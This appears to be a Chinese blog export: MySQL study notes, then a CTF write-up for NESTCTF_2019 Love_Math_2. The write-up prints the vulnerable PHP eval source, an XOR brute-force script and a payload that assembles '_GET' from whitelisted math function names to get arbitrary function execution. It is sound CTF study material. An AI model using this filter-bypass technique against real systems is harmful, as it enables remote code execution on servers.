语句，以下是基本的语法：\nUSE database_name;\n\n5.创建数据表创建 MySQL 数据表需要以下信息：\n\n表名\n表字段名\n定义每个表字段的数据类型\n\n以下为创建 MySQL 数据表的 SQL 通用语法：\nCREATE TABLE table_name (    column1 datatype,    column2 datatype,    ...);\n\n参数说明：\n\ntable_name 是你要创建的表的名称。\ncolumn1, column2, … 是表中的列名。\ndatatype 是每个列的数据类型。\n\n6.插入数据MySQL 表中使用 INSERT INTO 语句来插入数据。\n你可以通过 mysql&gt; 命令提示窗口中向数据表中插入数据，或者通过PHP脚本来插入数据。\n以下为向MySQL数据表插入数据通用的 INSERT INTO SQL语法：\nINSERT INTO table_name (column1, column2, column3, ...)VALUES (value1, value2, value3, ...);\n\n参数说明：\n\ntable_name 是你要插入数据的表的名称。\ncolumn1, column2, column3, … 是表中的列名。\nvalue1, value2, value3, … 是要插入的具体数值。\n\n如果数据是字符型，必须使用单引号 ‘ 或者双引号 **”**，如： ‘value1’, “value1”。\n7.查询数据MySQL 数据库使用 SELECT 语句来查询数据。\n以下为在 MySQL 数据库中查询数据通用的 SELECT 语法：\nSELECT column1, column2, ...FROM table_name[WHERE condition][ORDER BY column_name [ASC | DESC]][LIMIT number];\n\n参数说明：\n\ncolumn1, column2, … 是你想要选择的列的名称，如果使用 * 表示选择所有列。\ntable_name 是你要从中查询数据的表的名称。\nWHERE condition 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。\nORDER BY column_name [ASC | DESC] 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。\nLIMIT number 是一个可选的子句，用于限制返回的行数。\n\nSELECT 语句可以是灵活的，我们可以根据实际需求组合和使用这些子句，比如同时使用 WHERE 和 ORDER BY 子句，或者使用 LIMIT 控制返回的行数。\n在 WHERE 子句中，你可以使用各种条件运算符（如 =, &lt;, &gt;, &lt;=, &gt;=, !=），逻辑运算符（如 AND, OR, NOT），以及通配符（如 %）等。\n实例：\n-- 使用 AND 运算符和通配符SELECT * FROM users WHERE username LIKE &#x27;j%&#x27; AND is_active = TRUE;-- 使用 OR 运算符SELECT * FROM users WHERE is_active = TRUE OR birthdate &lt; &#x27;1990-01-01&#x27;;-- 使用 IN 子句SELECT * FROM users WHERE birthdate IN (&#x27;1990-01-01&#x27;, &#x27;1992-03-15&#x27;, &#x27;1993-05-03&#x27;);\n\n8.修改数据如果我们需要修改或更新 MySQL 中的数据，我们可以使用 UPDATE 命令来操作。\n以下是 UPDATE 命令修改 MySQL 数据表数据的通用 SQL 语法：\nUPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition;\n\n参数说明：\n\ntable_name 是你要更新数据的表的名称。\ncolumn1, column2, … 是你要更新的列的名称。\nvalue1, value2, … 是新的值，用于替换旧的值。\nWHERE condition 是一个可选的子句，用于指定更新的行。如果省略 WHERE 子句，将更新表中的所有行。\n\n9.删除数据你可以使用 DELETE FROM 命令来删除 MySQL 数据表中的记录。\n以下是 DELETE 语句从 MySQL 数据表中删除数据的通用语法：\nDELETE FROM table_nameWHERE condition;\n\n参数说明：\n\ntable_name 是你要删除数据的表的名称。\nWHERE condition 是一个可选的子句，用于指定删除的行。如果省略 WHERE 子句，将删除表中的所有行。\n\n更多说明：\n\n如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。\n你可以在 WHERE 子句中指定任何条件\n您可以在单个表中一次性删除记录。\n\n当你想删除数据表中指定的记录时 WHERE 子句是非常有用的。\n11.修改数据表 Alert当我们需要修改数据表名或者修改数据表字段时，就需要使用到 MySQL ALTER 命令\nMySQL 的 ALTER 命令用于修改数据库、表和索引等对象的结构。\nALTER 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添加约束、创建和删除索引等操作。\nALTER 命令非常强大，可以在数据库结构发生变化时进行灵活的修改和调整。\n1.添加列以下 SQL 语句在 employees 表中添加了一个名为 birth_date 的日期列：\n语法ALTER TABLE table_nameADD COLUMN new_column_name datatype;实例ALTER TABLE employeesADD COLUMN birth_date DATE;\n\n2.修改列的数据类型以下 SQL 语句将 employees 表中的 salary 列的数据类型修改为 DECIMAL(10,2)：\n语法ALTER TABLE TABLE_NAMEMODIFY COLUMN column_name new_datatype;实例ALTER TABLE employeesMODIFY COLUMN salary DECIMAL(10,2);modify的中文为改变\n\n3.修改列名以下 SQL 语句将 employees 表中的某个列的名字由 old_column_name 修改为 new_column_name，并且可以同时修改数据类型：\n语法ALTER TABLE table_nameCHANGE COLUMN old_column_name new_column_name datatype;实例ALTER TABLE employeesCHANGE COLUMN old_column_name new_column_name VARCHAR(255);change语句同时也能修改列的数据类型\n\n4.删除列以下 SQL 语句将 employees 表中的 birth_date 列删除：\n语法ALTER TABLE table_nameDROP COLUMN column_name;实例ALTER TABLE employeesDROP COLUMN birth_date;\n\n5. 添加 PRIMARY KEY说一下，primary的翻译为首要的，所以primary key的意思为主键\n语法ALTER TABLE table_nameADD PRIMARY KEY (column_name);实例ALTER TABLE employeesADD PRIMARY KEY (employee_id);\n\n6.添加 FOREIGN KEY\nforeign中文为外国的，所以foreign key为外键\n语法ALTER TABLE child_tableADD CONSTRAINT fk_nameFOREIGN KEY (column_name)REFERENCES parent_table (column_name);实例ALTER TABLE ordersADD CONSTRAINT fk_customerFOREIGN KEY (customer_id)REFERENCES customers (customer_id);\n\n3.MySQL函数基本操作差不多了，我也应该向做题那边靠了，只不过个人博客的开发还没开始，我不知道要求到底是什么程度，简单的话我拿留言板上去也算是实现了所有功能了\n函数我就抄些常用的函数\n-- 数学运算SELECT ABS(-8); -- 绝对值SELECT CEIL(5.1); -- 向上取整SELECT CEILING(5.1); -- 向上取整SELECT RAND(); -- 返回0~1之间的一个随机数SELECT SIGN(-10); -- 返回一个数的符号;0返回0;正数返回1;负数返回-1-- 字符串函数SELECT CHAR_LENGTH(&#x27;我喜欢你&#x27;); -- 字符串长度SELECT CONCAT(&#x27;我&#x27;,&#x27;喜欢&#x27;,&#x27;你&#x27;); -- 拼接字符串SELECT INSERT(&#x27;我喜欢&#x27;,1,1,&#x27;超级&#x27;) -- INSERT(str,pos,len,newstr) 从str的pos位置开始替换为长度为len的newstrSELECT UPPER(&#x27;zsr&#x27;); -- 转大写SELECT LOWER(&#x27;ZSR&#x27;); -- 转小写SELECT INSTR(&#x27;zsrs&#x27;,&#x27;s&#x27;); -- 返回第一次出现字串索引的位置SELECT REPLACE(&#x27;加油就能胜利&#x27;,&#x27;加油&#x27;,&#x27;坚持&#x27;); -- 替换出现的指定字符串SELECT SUBSTR(&#x27;坚持就是胜利&#x27;,3,6); -- 返回指定的字符串(源字符串,截取位置,截取长度)SELECT REVERSE(&#x27;rsz&#x27;); -- 反转字符串-- 时间日期函数SELECT CURRENT_DATE(); -- 获取当前日期SELECT CURDATE(); -- 获取当前日期SELECT now(); -- 获取当前时间SELECT LOCALTIME(); -- 本地时间SELECT SYSDATE(); -- 系统时间SELECT YEAR(NOW());SELECT MONTH(NOW());SELECT DAY(NOW());SELECT HOUR(NOW());SELECT MINUTE(NOW());SELECT SECOND(NOW());-- 系统信息SELECT SYSTEM_USER();SELECT USER();SELECT VERSION();\n\n其他的遇到了有必要再补充\n4.MySQL连接在前几章节中，我们已经学会了如何在一张表中读取数据，这是相对简单的，但是在真正的应用中经常需要从多个数据表中读取数据。\n本章节我们将向大家介绍如何使用 MySQL 的 JOIN 在两个或多个表中查询数据。\n你可以在 SELECT, UPDATE 和 DELETE 语句中使用 MySQL 的 JOIN 来联合多表查询。\nJOIN 按照功能大致分为如下三类：\n\nINNER JOIN（内连接,或等值连接）：获取两个表中字段匹配关系的记录。\nLEFT JOIN（左连接）：获取左表所有记录，即使右表没有对应匹配的记录。\nRIGHT JOIN（右连接）： 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。\n\n1.INNER JOININNER JOIN 返回两个表中满足连接条件的匹配行，以下是 INNER JOIN 语句的基本语法：\nSELECT column1, column2, ...FROM table1INNER JOIN table2 ON table1.column_name = table2.column_name;\n\n参数说明：\n\ncolumn1, column2, … 是你要选择的列的名称，如果使用 * 表示选择所有列。\ntable1, table2 是要连接的两个表的名称。\ntable1.column_name = table2.column_name 是连接条件，指定了两个表中用于匹配的列。\n\n简单的 INNER JOIN：\nSELECT orders.order_id, customers.customer_nameFROM ordersINNER JOIN customers ON orders.customer_id = customers.customer_id;\n\n以上 SQL 语句将选择 orders 表和 customers 表中满足连接条件的订单 ID 和客户名称\n使用表别名SELECT o.order_id, c.customer_nameFROM orders AS oINNER JOIN customers AS c ON o.customer_id = c.customer_id;多表SELECT orders.order_id, customers.customer_name, products.product_nameFROM ordersINNER JOIN customers ON orders.customer_id = customers.customer_idINNER JOIN order_items ON orders.order_id = order_items.order_idINNER JOIN products ON order_items.product_id = products.product_id;使用where子句进行过滤SELECT orders.order_id, customers.customer_nameFROM ordersINNER JOIN customers ON orders.customer_id = customers.customer_idWHERE orders.order_date &gt;= &#x27;2023-01-01&#x27;;\n\n2.LEFT JOINLEFT JOIN 返回左表的所有行，并包括右表中匹配的行，如果右表中没有匹配的行，将返回 NULL 值，以下是 LEFT JOIN 语句的基本语法：\nSELECT column1, column2, ...FROM table1LEFT JOIN table2 ON table1.column_name = table2.column_name;\n\n也就是说会返回table1所有的行，然后只会返回table1中匹配的行\n简单的LEFT JOIN\nSELECT customers.customer_id, customers.customer_name, orders.order_idFROM customersLEFT JOIN orders ON customers.customer_id = orders.customer_id;\n\n3.RIGHT JOINRIGHT JOIN 返回右表的所有行，并包括左表中匹配的行，如果左表中没有匹配的行，将返回 NULL 值，以下是 RIGHT JOIN 语句的基本语法：\nSELECT column1, column2, ...FROM table1RIGHT JOIN table2 ON table1.column_name = table2.column_name;\n\n和左匹配差不多\nSELECT customers.customer_id, orders.order_idFROM customersRIGHT JOIN orders ON customers.customer_id = orders.customer_id;\n\n5.MySQL导出数据MySQL 中你可以使用 SELECT…INTO OUTFILE 语句来简单的导出数据到文本文件上。\n1.使用SELECT …INTO OUTFILE导出查询数据SELECT…INTO OUTFILE 是 MySQL 中用于将查询结果导出到文件的语法。\nSELECT…INTO OUTFILE 允许你将查询的结果写入一个文本文件，基本的使用方法：\nSELECT column1, column2, ...INTO OUTFILE &#x27;file_path&#x27;FROM your_tableWHERE your_conditions;\n\n参数说明：\n\ncolumn1, column2, ...: 要选择的列。\n&#39;file_path&#39;: 指定输出文件的路径和名称。\nyour_table: 要查询的表。\nyour_conditions: 查询条件。\n\n实例\nINTO OUTFILE &#x27;/tmp/user_data.csv&#x27;FIELDS TERMINATED BY &#x27;,&#x27;LINES TERMINATED BY &#x27;\\n&#x27;FROM users;\n\n在以上 SQL 语句中，我们从 users 表中选择了 id、name 和 email 列，并将结果写入了 &#x2F;tmp&#x2F;user_data.csv 文件。FIELDS TERMINATED BY ‘,’ 指定了列之间的分隔符（逗号），LINES TERMINATED BY ‘\\n’ 指定了行之间的分隔符（换行符）。SELECT id, name, email\n需要注意的是，执行 SELECT…INTO OUTFILE 需要相应的权限，并且输出文件的目录需要是 MySQL 服务器可以写入的地方。\nSELECT … INTO OUTFILE 语句有以下属性:\n\nLOAD DATA INFILE是SELECT … INTO OUTFILE的逆操作，SELECT句法。为了将一个数据库的数据写入一个文件，使用SELECT … INTO OUTFILE，为了将文件读回数据库，使用LOAD DATA INFILE。\nSELECT…INTO OUTFILE ‘file_name’形式的SELECT可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。\n输出不能是一个已存在的文件。防止文件数据被篡改。\n你需要有一个登陆服务器的账号来检索文件。否则 SELECT … INTO OUTFILE 不会起任何作用。\n在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除。\n\n2.mysqldump导出表的原始数据mysqldump 是 MySQL 提供的用于备份和导出数据库的命令行工具。\nmysqldump 是 mysql 用于转存储数据库的实用程序。它主要产生一个 SQL 脚本，其中包含从头重新创建数据库所必需的命令 CREATE TABLE INSERT 等。\n使用 mysqldump 导出数据需要使用 –tab 选项来指定导出文件指定的目录，该目标必须是可写的。\nmysqldump 基本的用法：\nmysqldump -u username -p password -h hostname database_name &gt; output_file.sql\n\n参数说明：\n\n-u: 指定 MySQL 用户名。\n-p: 提示输入密码。\n-h: 指定 MySQL 主机名。\ndatabase_name: 要导出的数据库名称。\noutput_file.sql: 导出数据保存到的文件。\n\n实例\n#1.导出整个数据库mysqldump -u root -p mydatabase &gt; mydatabase_backup.sql#2.导出特定表mysqldump -u username -p password -h hostname database_name table_name &gt; output_file.sql#或者mysqldump -u root -p mydatabase mytable &gt; mytable_backup.sql#3.导出数据库结构mysqldump -u username -p password -h hostname --no-data database_name &gt; output_file.sql#4.导出压缩文件mysqldump -u username -p password -h hostname database_name | gzip &gt; output_file.sql.gz#5.导出SQL格式的数据$ mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txtpassword ******\n\n6.MySQL导入数据1.mysql命令导入使用 mysql 命令导入语法格式为：\nmysql -u your_username -p -h your_host -P your_port -D your_database\n\nyour_username、your_host、your_port、your_database 分别为你的 MySQL 用户名、主机、端口和数据库。\n实例\n# mysql -u root -p 123456 &lt; runoob.sql\n\n以上命令将将备份的整个数据库 runoob.sql 导入。\n执行上述命令后，系统将要求输入 MySQL 用户的密码。输入密码并按Enter键。\n这样，MySQL 将执行 SQL 文件中的语句，将数据导入到指定的数据库中。\n请注意，如果 SQL 文件包含创建数据库的语句，确保在执行导入之前数据库已经存在。如果文件包含创建表的语句，确保表不存在或者是空的，以免导入数据时发生冲突。\n2.source命令导入source 命令导入数据库需要先登录到数库终端：\nmysql&gt; create database abc;      # 创建数据库mysql&gt; use abc;                  # 使用已创建的数据库 mysql&gt; set names utf8;           # 设置编码mysql&gt; source /home/abc/abc.sql  # 导入备份数据库\n\n使用 source 命令的好处是，你可以在 MySQL 命令行中直接执行，而无需退出 MySQL 并使用其他命令。\n3.使用LOAD DATA导入数据MySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。\nmysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; INTO TABLE mytbl;\n\n如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。\n你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。\n两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。\n如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。\nmysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; INTO TABLE mytbl  -&gt; FIELDS TERMINATED BY &#x27;:&#x27;  -&gt; LINES TERMINATED BY &#x27;\\r\\n&#x27;;\n\nLOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。\n如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下：\nmysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27;     -&gt; INTO TABLE mytbl (b, c, a);\n\n4使用mysqlimport导入数据mysqlimport 客户端提供了 LOAD DATA INFILEQL 语句的一个命令行接口。mysqlimport 的大多数选项直接对应 LOAD DATA INFILE 子句。\n从文件 dump.txt 中将数据导入到 mytbl 数据表中, 可以使用以下命令：\n$ mysqlimport -u root -p --local mytbl dump.txtpassword *****\n\n7.MySQL运算符实在没想到MySQL也有运算符，但仔细一想也是有意义的\n本章节我们主要介绍 MySQL 的运算符及运算符的优先级。 MySQL 主要有以下几种运算符：\n\n算术运算符\n比较运算符\n逻辑运算符\n位运算符\n\n1.算术运算符MySQL 支持的算术运算符包括:\n\n\n\n运算符\n作用\n\n\n\n+\n加法\n\n\n-\n减法\n\n\n*\n乘法\n\n\n&#x2F; 或 DIV\n除法\n\n\n% 或 MOD\n取余\n\n\n在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。\n个人感觉没什么学的必要\n2.比较运算符SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。\n\n\n\n符号\n描述\n备注\n\n\n\n&#x3D;\n等于\n\n\n\n&lt;&gt;, !&#x3D;\n不等于\n\n\n\n&gt;\n大于\n\n\n\n&lt;\n小于\n\n\n\n&lt;&#x3D;\n小于等于\n\n\n\n&gt;&#x3D;\n大于等于\n\n\n\nBETWEEN\n在两值之间\n&gt;&#x3D;min&amp;&amp;&lt;&#x3D;max\n\n\nNOT BETWEEN\n不在两值之间\n\n\n\nIN\n在集合中\n\n\n\nNOT IN\n不在集合中\n\n\n\n&lt;&#x3D;&gt;\n严格比较两个NULL值是否相等\n两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0\n\n\nLIKE\n模糊匹配\n\n\n\nREGEXP 或 RLIKE\n正则式匹配\n\n\n\nIS NULL\n为空\n\n\n\nIS NOT NULL\n不为空\n\n\n\n展示几个我不认识的用法\n#BETWEENmysql&gt; select 5 between 1 and 10; #结果为真，返回1+--------------------+| 5 between 1 and 10 |+--------------------+|                  1 |+--------------------+#INmysql&gt; select 5 in (1,2,3,4,5);+------------------+| 5 in (1,2,3,4,5) |+------------------+|                1 |+------------------+#REGEXPmysql&gt; select &#x27;beijing&#x27; REGEXP &#x27;jing&#x27;;+-------------------------+| &#x27;beijing&#x27; REGEXP &#x27;jing&#x27; |+-------------------------+|                       1 |+-------------------------+mysql&gt; select &#x27;beijing&#x27; REGEXP &#x27;xi&#x27;;+-----------------------+| &#x27;beijing&#x27; REGEXP &#x27;xi&#x27; |+-----------------------+|                     0 |+-----------------------+\n\n3.通配符通配符应该不算运算符，但都到了like了，就看下\n%通配符\n%用于匹配任意长度的字符串。例如，字符串“a%”匹配以字符a开始任意长度的字符串\n#以li开头的数据select * from student where sname like &#x27;li%&#x27;;#以g结尾的数据select * from student where sname like &#x27;%g&#x27;;#含有s的数据select * from student where sname like &#x27;%s%&#x27;;\n\n_通配符\n下划线通配符只匹配单个字符，如果要匹配多个字符，需要连续使用多个下划线通配符。例如，字符串“ab_”匹配以字符串“ab”开始长度为3的字符串，如abc、abp等等；字符串“a__d”匹配在字符“a”和“d”之间包含两个字符的字符串，如”abcd”、”atud”等等。\n其他和%差不多\n4.逻辑运算符逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。\n\n\n\n运算符号\n作用\n\n\n\nNOT 或 !\n逻辑非\n\n\nAND\n逻辑与\n\n\nOR\n逻辑或\n\n\nXOR\n逻辑异或\n\n\n和C语言的一样\n5.位运算符位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。\n\n\n\n运算符号\n作用\n\n\n\n&amp;\n按位与\n\n\n|\n按位或\n\n\n^\n按位异或\n\n\n!\n取反\n\n\n&lt;&lt;\n左移\n\n\n&gt;&gt;\n右移\n\n\n\n\n8.MySQL正则表达式MySQL 同样也支持其他正则表达式的匹配， MySQL 中使用 REGEXP 和 RLIKE操作符来进行正则表达式匹配。\n下表中的正则模式可应用于 REGEXP 操作符中。\n\n\n\n模式\n描述\n\n\n\n^\n匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\\n’ 或 ‘\\r’ 之后的位置。\n\n\n$\n匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\\n’ 或 ‘\\r’ 之前的位置。\n\n\n.\n匹配除 “\\n” 之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用像 ‘[.\\n]’ 的模式。\n\n\n[…]\n字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。\n\n\n[^…]\n负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’。\n\n\np1|p2|p3\n匹配 p1 或 p2 或 p3。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。\n\n\n*\n匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。\n\n\n+\n匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。\n\n\n{n}\nn 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。\n\n\n{n,m}\nm 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。\n\n\n正则表达式匹配的字符类\n\n.：匹配任意单个字符。\n^：匹配字符串的开始。\n$：匹配字符串的结束。\n*：匹配零个或多个前面的元素。\n+：匹配一个或多个前面的元素。\n?：匹配零个或一个前面的元素。\n[abc]：匹配字符集中的任意一个字符。\n[^abc]：匹配除了字符集中的任意一个字符以外的字符。\n[a-z]：匹配范围内的任意一个小写字母。\n[0-9]：匹配一个数字字符。\n\\w：匹配一个字母数字字符（包括下划线）。\n\\s：匹配一个空白字符。\n\n1.使用REGEXP进行模式匹配REGEXP 是用于进行正则表达式匹配的运算符。\nREGEXP 用于检查一个字符串是否匹配指定的正则表达式模式，以下是 REGEXP 运算符的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE column_name REGEXP &#x27;pattern&#x27;;\n\n参数说明：\n\ncolumn1, column2, … 是你要选择的列的名称，如果使用 * 表示选择所有列。\ntable_name 是你要从中查询数据的表的名称。\ncolumn_name 是你要进行正则表达式匹配的列的名称。\n&#39;pattern&#39; 是一个正则表达式模式。\n\n#查找 name 字段中以 &#x27;st&#x27; 为开头的所有数据：mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;^st&#x27;;#查找 name 字段中以 &#x27;ok&#x27; 为结尾的所有数据：mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;ok$&#x27;;#查找 name 字段中以元音字符开头或以 &#x27;ok&#x27; 字符串结尾的所有数据：mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;^[aeiou]|ok$&#x27;;\n\n2.使用RLIKE进行模式匹配RLIKE 是 MySQL 中用于进行正则表达式匹配的运算符，与 REGEXP 是一样的，RLIKE 和 REGEXP 可以互换使用，没有区别。\n以下是使用 RLIKE 进行正则表达式匹配的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE column_name RLIKE &#x27;pattern&#x27;;\n\n参数说明：\n\ncolumn1, column2, … 是你要选择的列的名称，如果使用 * 表示选择所有列。\ntable_name 是你要从中查询数据的表的名称。\ncolumn_name 是你要进行正则表达式匹配的列的名称。\n&#39;pattern&#39; 是一个正则表达式模式。\n\nSELECT * FROM products WHERE product_name RLIKE &#x27;^[0-9]&#x27;;\n\n学会了正则表达式就需要去写脚本了\n9.MySQL弱类型比较在mysql里面和php一样也存在弱类型比较，而且规则也很相似\n在进行类型转换时，如果是字符串转数字，就会检索字符串里面的数字作为转换结果，比如1aaa转换结果为1，如果字母开头则为0\nctfshow里面web187和188都用了这个特性\n"},{"title":"[NESTCTF_2019]Love_Math_2","url":"/2025/05/21/NESTCTF-2019-Love-Math-2/","content":"[NESTCTF_2019]Love_Math_2&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123;    show_source(__FILE__);&#125;else&#123;    //例子 c=20-1    $content = $_GET[&#x27;c&#x27;];    if (strlen($content) &gt;= 60) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;,  &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];    preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs);    foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    //帮你算出答案    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125;\n\n这个题目也是学到了，在有白名单限制的情况下通过万能的异或拼接竟然完成了命令执行，看来不能不把异或和取反符给禁掉\n这个题目先是使用了黑名单过滤掉了我们的空格，引号，以及一些符号，但是着还不是最大的问题，后面有一个白名单，我们只能包含白名单中出现过的字符串。\n我们还需要注意下preg_match_all(&#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#39;, $content, $used_funcs);这个代码\npreg_match_all\npreg_match_all 是 PHP 中一个强大的正则表达式匹配函数，用于在字符串中执行全局正则表达式匹配。与 preg_match 不同，它会查找所有匹配而不仅仅是第一个匹配。\n而后面那个正则则是php中的命名规则，包括函数和变量的命名规则。并将结果存入 $used_funcs 数组\n看了题解，发现我们可以直接在可用字符有限的情况下使用暴力异或进行，对结果进行搜错出我们需要的结果\n这里贴下大佬的脚本\n&lt;?php$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;,  &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];for($k=1;$k&lt;=sizeof($payload);$k++)&#123;    for($i = 0;$i &lt; 9; $i++)&#123;        for($j = 0;$j &lt;=9;$j++)&#123;            $exp = $payload[$k] ^ $i.$j;            echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;);            echo &quot;&lt;br /&gt;&quot;;        &#125;    &#125;&#125;\n\n总的来说我们本来可以让所有函数名都尝试一遍异或的，但是那样就工程太大了，php中命名规则不允许数字开头，于是我们只需要让数字和函数名进行异或即可\n还有就是，这个命令执行的代码eval(&#39;echo &#39;.$content.&#39;;&#39;);我一开始想到的是闭合echo命令，然后进行代码执行，但是在命令执行里面，可以使用跳板。即通过echo获取参数，然后使用参数进行命令执行即可\npayload\nmt_rand^23==&gt;_Gtan^15==&gt;ET$pi=(mt_rand^(2).(3)).(tan^(1).(5)) 即 $pi=_GET$pi=$$pi 即 $pi=$_GET$pi&#123;1&#125;($pi&#123;2&#125;) 